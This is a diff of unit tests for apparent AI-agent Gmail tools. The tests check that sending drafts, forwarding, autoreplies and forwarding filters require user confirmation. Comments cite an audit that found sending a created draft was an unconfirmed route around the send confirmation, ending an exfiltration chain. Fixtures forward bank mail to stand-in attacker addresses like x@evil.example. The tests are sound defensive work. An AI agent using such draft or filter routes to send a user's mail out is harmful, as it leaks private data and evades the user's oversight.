@@ -2018,12 +2018,106 @@ describe('gog_gmail_drafts_delete', () => {
 });
 
 describe('gog_gmail_drafts_send', () => {
-  it('calls runOrDiagnose with draftId', async () => {
+  const b64url = (t: string) => Buffer.from(t, 'utf8').toString('base64url');
+  const DRAFT = JSON.stringify({
+    draft: {
+      id: 'd1',
+      message: {
+        id: 'm1',
+        payload: {
+          mimeType: 'multipart/mixed',
+          headers: [
+            { name: 'To', value: 'Mallory <mallory@evil.example>' },
+            { name: 'Cc', value: 'carol@example.com' },
+            { name: 'Subject', value: 'Quarterly numbers' },
+          ],
+          parts: [
+            { mimeType: 'text/plain', body: { data: b64url('Please find the export attached.') } },
+            { mimeType: 'application/json', filename: 't.json', body: { attachmentId: 'a1' } },
+          ],
+        },
+      },
+    },
+  });
+
+  // The confirmed retry re-runs the handler from scratch (nothing from the
+  // first round is trusted), so the draft is read once per round.
+  it('reads the draft, then sends it by id once the user confirms', async () => {
+    vi.mocked(lib.runOrDiagnose).mockResolvedValue(rawTextResult(DRAFT));
     await harness.callTool('gog_gmail_drafts_send', { draftId: 'd1' });
-    expect(lib.runOrDiagnose).toHaveBeenCalledWith(
-      ['gmail', 'drafts', 'send', pos('d1')],
-      { account: undefined },
-    );
+    expect(lib.runOrDiagnose).toHaveBeenCalledTimes(3);
+    expect(lib.runOrDiagnose).toHaveBeenNthCalledWith(1, ['gmail', 'drafts', 'get', pos('d1')], { account: undefined });
+    expect(lib.runOrDiagnose).toHaveBeenNthCalledWith(2, ['gmail', 'drafts', 'get', pos('d1')], { account: undefined });
+    expect(lib.runOrDiagnose).toHaveBeenNthCalledWith(3, ['gmail', 'drafts', 'send', pos('d1')], { account: undefined });
+  });
+
+  // SEC-2: drafts_create + drafts_send was an unconfirmed route around the
+  // send rail — the exfiltration chain in the audit ended exactly here.
+  it('asks the user first, showing recipients, subject, body and attachments, and sends nothing on decline', async () => {
+    vi.mocked(lib.runOrDiagnose).mockResolvedValue(rawTextResult(DRAFT));
+    let request: ElicitRequest | undefined;
+    elicitation = async (value) => {
+      request = value;
+      return { action: 'decline' };
+    };
+    const result = await harness.callTool('gog_gmail_drafts_send', { draftId: 'd1' });
+    expect(vi.mocked(lib.runOrDiagnose).mock.calls.every((c) => (c[0] as unknown[])[2] === 'get')).toBe(true);
+    expect(JSON.parse(result.content[0].text as string)).toEqual(expect.objectContaining({
+      cancelled: true, action: 'gmail.drafts-send',
+    }));
+    const details = (JSON.parse(request!.params.message.split('\n').slice(1).join('\n')) as { details: Record<string, unknown> }).details;
+    expect(details.recipients).toEqual(['mallory@evil.example', 'carol@example.com']);
+    expect(details.subject).toBe('Quarterly numbers');
+    expect(details.bodyPreview).toBe('Please find the export attached.');
+    expect(details.attachments).toEqual(['t.json']);
+  });
+
+  it('logs the dispatch with the draft recipients after an accepted send', async () => {
+    vi.mocked(lib.runOrDiagnose).mockResolvedValue(rawTextResult(DRAFT));
+    const writeSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+    await harness.callTool('gog_gmail_drafts_send', { draftId: 'd1' });
+    const event = JSON.parse((writeSpy.mock.calls.at(-1)?.[0] as string).trim());
+    expect(event.tool).toBe('gog_gmail_drafts_send');
+    expect(event.recipientCount).toBe(2);
+    writeSpy.mockRestore();
+  });
+
+  it('does not log when the confirmed send itself fails', async () => {
+    vi.mocked(lib.runOrDiagnose)
+      .mockResolvedValueOnce(rawTextResult(DRAFT))
+      .mockResolvedValueOnce(rawTextResult(DRAFT))
+      .mockResolvedValueOnce(errorResult('quota exceeded'));
+    const writeSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+    const result = await harness.callTool('gog_gmail_drafts_send', { draftId: 'd1' });
+    expect(result.isError).toBe(true);
+    expect(writeSpy.mock.calls.some((c) => String(c[0]).includes('gmail_dispatch'))).toBe(false);
+    writeSpy.mockRestore();
+  });
+
+  it('asks with an empty preview when the draft read returns no text block', async () => {
+    vi.mocked(lib.runOrDiagnose).mockResolvedValue({ content: [] });
+    let request: ElicitRequest | undefined;
+    elicitation = async (value) => {
+      request = value;
+      return { action: 'decline' };
+    };
+    await harness.callTool('gog_gmail_drafts_send', { draftId: 'd1' });
+    const details = (JSON.parse(request!.params.message.split('\n').slice(1).join('\n')) as { details: Record<string, unknown> }).details;
+    expect(details.recipients).toEqual([]);
+  });
+
+  it('still asks, with only the id, when the stored draft cannot be read', async () => {
+    vi.mocked(lib.runOrDiagnose).mockResolvedValue(rawTextResult('not json'));
+    let request: ElicitRequest | undefined;
+    elicitation = async (value) => {
+      request = value;
+      return { action: 'decline' };
+    };
+    await harness.callTool('gog_gmail_drafts_send', { draftId: 'd1' });
+    const details = (JSON.parse(request!.params.message.split('\n').slice(1).join('\n')) as { details: Record<string, unknown> }).details;
+    expect(details.draftId).toBe('d1');
+    expect(details.recipients).toEqual([]);
+    expect(vi.mocked(lib.runOrDiagnose).mock.calls.some((c) => (c[0] as unknown[])[2] === 'send')).toBe(false);
   });
 });
 
@@ -2090,6 +2184,18 @@ describe('gog_gmail_forward', () => {
       cancelled: true,
       action: 'gmail.forward',
     }));
+  });
+
+  it('shows the forward note itself in the prompt (SEC-5)', async () => {
+    let request: ElicitRequest | undefined;
+    elicitation = async (value) => {
+      request = value;
+      return { action: 'decline' };
+    };
+    await harness.callTool('gog_gmail_forward', { messageId: 'm1', to: 'a@b.com', note: 'FYI see below' });
+    const details = (JSON.parse(request!.params.message.split('\n').slice(1).join('\n')) as { details: Record<string, unknown> }).details;
+    expect(details.notePreview).toBe('FYI see below');
+    expect(details.attachmentsIncluded).toBe(true);
   });
 
   it('sends nothing when the user accepts but leaves confirmation false', async () => {
@@ -2375,6 +2481,11 @@ describe('gog_gmail_autoreply', () => {
     expect(JSON.parse(result.content[0].text as string).cancelled).toBe(true);
     expect(details.matchCount).toBe(2);
     expect(details.sampleSenders).toEqual(['alice@example.com', 'bob@example.com']);
+  });
+
+  it('shows the reply text itself in the prompt (SEC-5)', async () => {
+    const { details } = await autoreplyPrompt({ body: 'Out until Monday' });
+    expect(details.bodyPreview).toBe('Out until Monday');
   });
 
   it('measures bodyLength from bodyHtml when no plain body is given', async () => {
@@ -2671,6 +2782,55 @@ describe('gog_gmail_filters_get', () => {
       ['gmail', 'settings', 'filters', 'get', pos('f1')],
       { account: undefined },
     );
+  });
+});
+
+describe('gog_gmail_filters_create — forwarding needs confirmation', () => {
+  // SEC-2: a forward action sends every FUTURE matching message elsewhere.
+  it('asks before creating a forwarding filter and creates nothing on decline', async () => {
+    let request: ElicitRequest | undefined;
+    elicitation = async (value) => {
+      request = value;
+      return { action: 'decline' };
+    };
+    const result = await harness.callTool('gog_gmail_filters_create', { query: 'from:bank', forward: 'x@evil.example' });
+    expect(lib.runOrDiagnose).not.toHaveBeenCalled();
+    expect(JSON.parse(result.content[0].text as string).action).toBe('gmail.filter-forward');
+    const details = (JSON.parse(request!.params.message.split('\n').slice(1).join('\n')) as { details: Record<string, unknown> }).details;
+    expect(details.forwardTo).toBe('x@evil.example');
+    expect(details.criteria).toEqual({ query: 'from:bank' });
+  });
+
+  it('creates it and logs the forward target once the user confirms', async () => {
+    const writeSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+    await harness.callTool('gog_gmail_filters_create', { from: 'a@x.com', forward: 'x@evil.example' });
+    expect(lib.runOrDiagnose).toHaveBeenCalledWith(
+      ['gmail', 'settings', 'filters', 'create', '--from=a@x.com', '--forward=x@evil.example', '--force'],
+      { account: undefined },
+    );
+    const event = JSON.parse((writeSpy.mock.calls.at(-1)?.[0] as string).trim());
+    expect(event.tool).toBe('gog_gmail_filters_create');
+    expect(event.externalRecipients).toEqual(['x@evil.example']);
+    writeSpy.mockRestore();
+  });
+
+  it('does not log when creating the filter fails', async () => {
+    vi.mocked(lib.runOrDiagnose).mockResolvedValue(errorResult('boom'));
+    const writeSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+    await harness.callTool('gog_gmail_filters_create', { forward: 'x@evil.example' });
+    expect(writeSpy).not.toHaveBeenCalled();
+    writeSpy.mockRestore();
+  });
+
+  it('asks nothing for a filter that does not forward', async () => {
+    let asked = false;
+    elicitation = async () => {
+      asked = true;
+      return { action: 'decline' };
+    };
+    await harness.callTool('gog_gmail_filters_create', { from: 'a@x.com', archive: true });
+    expect(asked).toBe(false);
+    expect(lib.runOrDiagnose).toHaveBeenCalledTimes(1);
   });
 });
 
